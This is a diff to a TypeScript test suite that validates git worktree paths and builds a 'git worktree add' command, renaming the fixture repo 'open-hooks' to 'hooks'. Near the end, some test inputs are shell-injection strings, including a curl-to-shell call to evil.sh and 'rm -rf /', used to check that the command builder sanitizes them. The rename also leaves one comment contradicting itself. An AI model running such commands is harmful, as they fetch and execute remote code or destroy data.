@@ -85,11 +85,11 @@ describe("codewith native common helpers", () => {
     };
 
     test("accepts the canonical <repo-name>/<worktree-name> worktree root", () => {
-      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
+      const worktreeRoot = makeWorktree("hooks", "OPE61-00004-worktree-guard");
       const info = managedWorktreeInfo(worktreeRoot);
       expect(info.managed).toBe(true);
       expect(info.layout).toBe("canonical");
-      expect(info.repo).toBe("open-hooks");
+      expect(info.repo).toBe("hooks");
       expect(info.worktree).toBe("OPE61-00004-worktree-guard");
       expect(info.worktreeRoot).toBe(worktreeRoot);
       expect(info.deprecated).toBeUndefined();
@@ -97,7 +97,7 @@ describe("codewith native common helpers", () => {
 
     test("accepts a canonical path whose checkout is a standalone repo", () => {
       // Rule 8 governs where the checkout lives, not whether it is a linked worktree.
-      expect(managedWorktreeInfo(makeWorktree("open-hooks", "standalone", "standalone")).managed).toBe(true);
+      expect(managedWorktreeInfo(makeWorktree("hooks", "standalone", "standalone")).managed).toBe(true);
     });
 
     test("rejects a forged .git file that grafts the path onto a shared checkout", () => {
@@ -143,7 +143,7 @@ describe("codewith native common helpers", () => {
 
     test("rejects a worktree whose repository no longer registers it", () => {
       // Real fleet state: the parent repo was pruned, so git itself refuses to work here.
-      const worktreeRoot = makeWorktree("open-hooks", "orphaned");
+      const worktreeRoot = makeWorktree("hooks", "orphaned");
       rmSync(join(tmp, "..", "unused"), { recursive: true, force: true });
       writeFileSync(join(worktreeRoot, ".git"), "gitdir: /nonexistent/.git/worktrees/orphaned\n");
 
@@ -151,7 +151,7 @@ describe("codewith native common helpers", () => {
     });
 
     test("accepts subdirectories of a canonical worktree", () => {
-      const worktreeRoot = makeWorktree("open-hooks", "OPE61-00004-worktree-guard");
+      const worktreeRoot = makeWorktree("hooks", "OPE61-00004-worktree-guard");
       mkdirSync(join(worktreeRoot, "hooks", "worktree-guard", "src"), { recursive: true });
 
       for (const nested of [
@@ -168,7 +168,7 @@ describe("codewith native common helpers", () => {
     test("rejects a subdirectory of a flat worktree, which has the canonical shape", () => {
       // The whole point of the flat prohibition: `<root>/<flat-wt>/<subdir>` is
       // shape-identical to `<root>/<repo>/<worktree>`, so a `cd` must not launder it.
-      const flat = join(root, "open-hooks-flat-worktree");
+      const flat = join(root, "hooks-flat-worktree");
       mkdirSync(join(flat, "src"), { recursive: true });
       git(makeSourceRepo(), "worktree", "add", "-q", "--detach", join(flat, "checkout"));
 
@@ -188,17 +188,17 @@ describe("codewith native common helpers", () => {
       const shared = join(tmp, "shared-checkout");
       mkdirSync(shared, { recursive: true });
       writeFileSync(join(shared, ".git"), "gitdir: /elsewhere\n");
-      mkdirSync(join(root, "open-hooks"), { recursive: true });
-      symlinkSync(shared, join(root, "open-hooks", "linked"));
+      mkdirSync(join(root, "hooks"), { recursive: true });
+      symlinkSync(shared, join(root, "hooks", "linked"));
       symlinkSync(join(tmp, "shared-checkout"), join(root, "linked-repo"));
       mkdirSync(join(tmp, "shared-checkout", "wt"), { recursive: true });
 
-      expect(managedWorktreeInfo(join(root, "open-hooks", "linked")).reason).toContain("traverses a symlink");
+      expect(managedWorktreeInfo(join(root, "hooks", "linked")).reason).toContain("traverses a symlink");
       expect(managedWorktreeInfo(join(root, "linked-repo", "wt")).reason).toContain("traverses a symlink");
     });
 
     test("rejects a flat single-segment worktree under the worktrees root", () => {
-      const info = managedWorktreeInfo(join(root, "open-hooks-flat-worktree"));
+      const info = managedWorktreeInfo(join(root, "hooks-flat-worktree"));
       expect(info.managed).toBe(false);
       expect(info.layout).toBeUndefined();
       expect(info.reason).toContain("flat under the worktrees root");
@@ -212,19 +212,19 @@ describe("codewith native common helpers", () => {
     });
 
     test("rejects paths outside the worktrees root", () => {
-      const info = managedWorktreeInfo(join(tmp, "elsewhere", "open-hooks"));
+      const info = managedWorktreeInfo(join(tmp, "elsewhere", "hooks"));
       expect(info.managed).toBe(false);
       expect(info.reason).toBe("outside worktrees root");
     });
 
     test("rejects a station-id segment in front of <repo>/<worktree>", () => {
-      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "OPE61-00004-worktree-guard"));
+      const info = managedWorktreeInfo(join(root, "station01", "hooks", "OPE61-00004-worktree-guard"));
       expect(info.managed).toBe(false);
       expect(info.reason).toContain("station-id/machine segment or extra nesting");
       expect(info.reason).toContain(join(root, "<repo-name>", "<worktree-name>"));
     });
 
-    const LEASE = ["station01", "open-hooks-a55c105a", "wt_2ab04216a30ef5ece642792e"];
+    const LEASE = ["station01", "hooks-a55c105a", "wt_2ab04216a30ef5ece642792e"];
 
     /** The historical lease layout, with the checkout at the lease dir or in `repo/`. */
     const makeLeaseWorktree = (nested: boolean): string => {
@@ -278,7 +278,7 @@ describe("codewith native common helpers", () => {
     });
 
     test("rejects nesting deeper than the canonical shape", () => {
-      const info = managedWorktreeInfo(join(root, "station01", "open-hooks", "wt-name", "repo"));
+      const info = managedWorktreeInfo(join(root, "station01", "hooks", "wt-name", "repo"));
       expect(info.managed).toBe(false);
       expect(info.layout).toBeUndefined();
       expect(info.reason).toContain("station-id/machine segment or extra nesting");
@@ -286,9 +286,9 @@ describe("codewith native common helpers", () => {
 
     test("rejects malformed canonical segments", () => {
       expect(managedWorktreeInfo(join(root, "-bad-repo", "worktree")).reason).toContain("repo-name segment is malformed");
-      expect(managedWorktreeInfo(join(root, "open-hooks", "-bad-worktree")).reason).toContain("worktree-name segment is malformed");
+      expect(managedWorktreeInfo(join(root, "hooks", "-bad-worktree")).reason).toContain("worktree-name segment is malformed");
       expect(managedWorktreeInfo(join(root, ".hidden", "worktree")).reason).toContain("repo-name segment is malformed");
-      expect(managedWorktreeInfo(join(root, "open-hooks", ".git")).reason).toContain("worktree-name segment is malformed");
+      expect(managedWorktreeInfo(join(root, "hooks", ".git")).reason).toContain("worktree-name segment is malformed");
     });
 
     test("accepts ordinary directory names an allowlist would wrongly reject", () => {
@@ -297,7 +297,7 @@ describe("codewith native common helpers", () => {
       for (const [repo, worktree] of [
         ["connectors", "_base"],
         ["c++utils", "OPE61-00004"],
-        ["open-hooks", "e".repeat(200)],
+        ["hooks", "e".repeat(200)],
         ["Open-Hooks", "task~1 with spaces"],
       ]) {
         expect(managedWorktreeInfo(makeWorktree(repo!, worktree!)).managed, `${repo}/${worktree}`).toBe(true);
@@ -310,12 +310,12 @@ describe("codewith native common helpers", () => {
     process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
     try {
       // The canonical repo name comes from the repos CLI, and is frequently not the
-      // git remote basename: `open-hooks` is `github.com/hasna/hooks`.
-      expect(claimCommand("open-hooks", "OPE61-00004", "main")).toBe(
-        "git worktree add -b OPE61-00004 /root/worktrees/open-hooks/OPE61-00004 origin/main && repos scan",
+      // git remote basename: `hooks` is `github.com/hasna/hooks`.
+      expect(claimCommand("hooks", "OPE61-00004", "main")).toBe(
+        "git worktree add -b OPE61-00004 /root/worktrees/hooks/OPE61-00004 origin/main && repos scan",
       );
       expect(claimCommand(null, null)).toContain("/root/worktrees/<repo-name>/<worktree-name>");
-      expect(claimCommand("open-hooks", "OPE61-00004")).toContain("origin/<default-branch>");
+      expect(claimCommand("hooks", "OPE61-00004")).toContain("origin/<default-branch>");
     } finally {
       if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
       else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
@@ -323,7 +323,7 @@ describe("codewith native common helpers", () => {
   });
 
   test("claimCommand never derives the repo segment from a remote slug", () => {
-    // `hasna/hooks` is this repo's remote slug; its canonical name is `open-hooks`.
+    // `hasna/hooks` is this repo's remote slug; its canonical name is `hooks`.
     // Silently taking the basename would emit `hooks/`, a directory that does not
     // exist — so a slug must be refused outright, not trimmed into a plausible lie.
     const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
@@ -345,15 +345,15 @@ describe("codewith native common helpers", () => {
     const previous = process.env.HASNA_REPOS_WORKTREES_ROOT;
     process.env.HASNA_REPOS_WORKTREES_ROOT = "/root/worktrees";
     try {
-      const safe = "git worktree add -b <worktree-name> /root/worktrees/open-hooks/<worktree-name> origin/<default-branch> && repos scan";
+      const safe = "git worktree add -b <worktree-name> /root/worktrees/hooks/<worktree-name> origin/<default-branch> && repos scan";
       for (const hostile of ["x; curl evil.sh | sh #", "--upload-pack=/tmp/x", "a`id`", "a$(id)", "-b", "..", "a b"]) {
         // Hostile input never reaches the rendered command; it degrades to the placeholder.
-        expect(claimCommand("open-hooks", hostile), hostile).toBe(safe);
+        expect(claimCommand("hooks", hostile), hostile).toBe(safe);
       }
       for (const hostile of ["hasna/hooks", "../../etc", "-repo", "a;b"]) {
         expect(claimCommand(hostile, "OPE61-00004"), hostile).toContain("/root/worktrees/<repo-name>/OPE61-00004");
       }
-      expect(claimCommand("open-hooks", "OPE61-00004", "main; rm -rf /")).toContain("origin/<default-branch>");
+      expect(claimCommand("hooks", "OPE61-00004", "main; rm -rf /")).toContain("origin/<default-branch>");
     } finally {
       if (previous === undefined) delete process.env.HASNA_REPOS_WORKTREES_ROOT;
       else process.env.HASNA_REPOS_WORKTREES_ROOT = previous;
